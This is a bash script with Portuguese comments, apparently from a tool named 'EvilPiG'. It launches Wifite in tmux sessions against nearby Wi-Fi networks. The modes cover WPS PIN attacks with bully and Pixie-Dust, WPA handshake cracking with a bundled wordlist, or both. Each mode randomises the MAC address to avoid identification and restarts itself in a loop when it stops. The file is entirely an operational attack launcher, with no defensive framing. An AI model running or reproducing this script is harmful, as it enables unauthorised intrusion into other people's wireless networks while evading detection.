#!/bin/bash

# Verifica se um parâmetro foi passado
if [ $# -lt 2 ]; then
    echo "Uso: $0 <interface_wifi> [1|2|3]"
    exit 1
fi

INTERFACE="$1"

# Função para iniciar a sessão do tmux
start_session() {
    # Verifica o parâmetro e executa os comandos apropriados
    case $1 in
        1)
            # Nome da sessão
            SESSION_NAME="evilpig-wifi-wps-$INTERFACE"

            tmux new-session -d -s $SESSION_NAME

            # Muda para o diretório do Wifite
            tmux send-keys -t $SESSION_NAME "cd /opt/EvilPiG/wifite3" C-m

            # Apenas ataque WPS
            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i $INTERFACE --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 30 --wps-fails 30 -p 30 > /opt/EvilPiG/wifite3/wifite.log && exit" C-m
            ;;
        2)
            # Nome da sessão
            SESSION_NAME="evilpig-wifi-wpa-$INTERFACE"

            tmux new-session -d -s $SESSION_NAME

            # Muda para o diretório do Wifite
            tmux send-keys -t $SESSION_NAME "cd /opt/EvilPiG/wifite3" C-m

            # Apenas ataque WPA
            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i $INTERFACE --random-mac --no-wps --clients-only -v --dict /opt/EvilPiG/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 30 > /opt/EvilPiG/wifite3/wifite.log && exit" C-m
            ;;
        3)
            # Nome da sessão
            SESSION_NAME="evilpig-wifi-mix-$INTERFACE"

            tmux new-session -d -s $SESSION_NAME

            # Muda para o diretório do Wifite
            tmux send-keys -t $SESSION_NAME "cd /opt/EvilPiG/wifite3" C-m

            # Ataques WPS e WPA
            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i $INTERFACE --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 30 --wps-fails 30 -p 30 > /opt/EvilPiG/wifite3/wifite.log && python3 Wifite.py -i $INTERFACE --random-mac --no-wps --clients-only -v --dict /opt/EvilPiG/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 30 >> /opt/EvilPiG/wifite3/wifite.log && exit" C-m
            ;;
        *)
            echo "Parâmetro inválido. Use 1 para WPS, 2 para WPA ou 3 para ambos."
            exit 1
            ;;
    esac
}

# Iniciar a sessão com o parâmetro fornecido
start_session $2

# Loop para monitorar a sessão
while true; do
    # Verifica se a sessão ainda está ativa
    if ! tmux has-session -t $SESSION_NAME 2>/dev/null; then
        echo "A sessão '$SESSION_NAME' foi encerrada. Reiniciando..."
        start_session $2
    fi
    
    # Aguarda um tempo antes de verificar novamente
    sleep 5
done